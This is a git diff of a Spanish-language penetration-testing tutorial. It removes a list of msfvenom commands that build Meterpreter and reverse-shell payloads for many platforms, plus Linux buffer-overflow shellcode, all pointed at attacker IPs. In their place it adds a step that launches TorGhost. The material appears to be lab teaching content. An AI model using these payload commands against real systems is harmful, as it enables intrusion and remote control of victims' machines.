@@ -44,56 +44,31 @@ pip install -r requirements.txt
 </b>
 
 
-Así, podemos crear diversos tipos de payloads:
+- <b>Paso 3</b>: Se arranca la aplicación TorGhost:
 <b>
 
 ```
-# Para Windows
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atacante] -f exe > payload.exe
-```
-```
-# En Java
-msfvenom -p java/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atacante] -f jar > payload.jar
-```
-```
-# En python
-msfvenom -p python/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atacante] -o troyano.py
-```
-```
-# Para Windows
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atacante] -o troyano.exe
-```
-```
-# Para Linux
-msfvenom -p linux/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atacante] -o troyano.exe
-```
-```
-# Buffer Overflow en Linux - Shellcode
-msfvenom -p linux/x86/shell_reverse_tcp lhost=[ip_atacante] lport=[puerto_atacante] --format c --arch x86 --platform linux 
---bad-chars "\x00\x09\x0a\x20" --out shellcode
+python3 torghost.py
 ```
 </b>
 
-<b>Ejemplos de generación de un Meterpreter con MSFVenom:</b>
-<b>
+En este momento, aparecerá una pantalla similar a la siguiente imagen:
 
-```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform windows -a x64 -n 200 -e generic/none -i 4 
--f exe -o reverse_shell.exe
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f elf > shell.elf
-msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f exe > shell.exe
-msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f macho > shell.macho
-msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && 
-echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
-msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f asp > shell.asp
-msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.jsp
-msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f war > shell.war
-msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > shell.py
-msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4242 -f raw > shell.sh
-msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw > shell.pl
-msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=192.168.1.222 lport=1234 -f elf -o origen_shell
-```
-</b>
+<picture>
+  <source media="(prefers-color-scheme: dark)" srcset="torghost_1.png">
+  <source media="(prefers-color-scheme: light)" srcset="torghost_1.png">
+  <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="torghost_1.png" width="50%">
+</picture>
+
+
+
+
+
+
+
+
+
+
 
 - <b>Paso 4</b>: Volviendo a Metasploit Framework, configuramos el payload con el que se va a realizar la escucha, es decir, con el que realmente se ha infectado al host objetivo.
 <b>
